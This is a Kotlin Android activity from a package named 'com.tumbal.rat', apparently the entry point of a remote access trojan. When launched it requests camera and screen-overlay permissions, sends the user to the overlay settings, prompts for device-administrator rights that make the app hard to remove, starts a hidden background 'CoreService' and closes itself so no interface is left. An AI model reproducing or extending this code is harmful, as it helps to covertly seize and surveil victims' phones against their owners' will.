package com.tumbal.rat

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    private lateinit var dpm: DevicePolicyManager
    private lateinit var adminName: ComponentName

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(arrayOf(
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.SYSTEM_ALERT_WINDOW
            ), 100)
        }

        if (!Settings.canDrawOverlays(this)) {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName"))
            startActivity(intent)
        }

        dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminName = ComponentName(this, AdminReceiver::class.java)
        if (!dpm.isAdminActive(adminName)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminName)
            startActivity(intent)
        }

        startService(Intent(this, CoreService::class.java))
        finish()
    }
}
